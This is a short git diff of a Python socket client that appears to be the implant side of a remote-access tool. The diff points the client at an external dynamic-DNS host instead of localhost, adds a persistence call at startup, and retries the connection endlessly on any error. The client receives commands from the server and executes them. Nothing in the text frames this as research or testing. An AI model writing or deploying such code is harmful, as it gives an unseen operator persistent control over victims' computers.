@@ -10,9 +10,11 @@
 #                                                                              #
 # **************************************************************************** #
 
-import json
-import socket
 from time import sleep
+import socket
+import struct
+import json
+
 
 from commands import Command
 
@@ -21,6 +23,7 @@ class Client:
 		self.socket:	socket.socket = None
 		self.commands:	Command = Command(self)
 
+		self.commands.persistance([1])
 		self.initSocket()
 
 	def connectSocket(self) -> None:
@@ -28,11 +31,11 @@ class Client:
 			print("trying..")
 
 			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			self.socket.connect(('localhost', 5454))
+			self.socket.connect(('singularityred.ddns.net', 5454))
 			
 			print("connected")
 		
-		except ConnectionRefusedError:
+		except:
 			sleep(5)
 			self.connectSocket()
 
@@ -50,7 +53,7 @@ class Client:
 			data_type = data[0]
 			if (data_type == "command"):
 				command = data[1][0]
-				command_args = data[1][1]
+				command_args = data[1][1:]
 
 				self.commands.command(command, command_args)
 
@@ -66,7 +69,8 @@ class Client:
 		try:
 			if (encoding):
 				data = data.encode()
-			self.socket.sendall(data)
+			message = struct.pack(">I", len(data)) + data
+			self.socket.sendall(message)
 		except:
 			return False
 		return True
